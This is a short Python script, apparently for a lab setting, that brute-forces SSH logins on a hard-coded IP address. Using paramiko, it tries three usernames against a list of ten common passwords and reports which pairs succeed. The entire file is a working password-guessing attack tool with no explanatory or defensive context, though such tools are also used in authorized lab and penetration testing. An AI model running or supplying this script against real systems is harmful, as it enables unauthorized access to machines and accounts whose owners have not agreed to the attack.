import paramiko

# Target information
target_ip = '192.10.20.4'
usernames = ['test', 'admin', 'vagrant']  # Example usernames
passwords = ['123456', 'password', 'admin', 'root',
             'letmein', 'qwerty', 'vagrant','abc123', 
             'toor', 'user']  # 10 passwords

for username in usernames:
    for password in passwords:
        try:
            print(f"Trying: {username}:{password}")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=username, password=password, timeout=5)
            print(f"Success: {username}:{password}")
            client.close()
            break
        except paramiko.AuthenticationException:
            print(f"Failed: {username}:{password}")
        except Exception as e:
            print(f"Error: {e}")

        
        
        
        
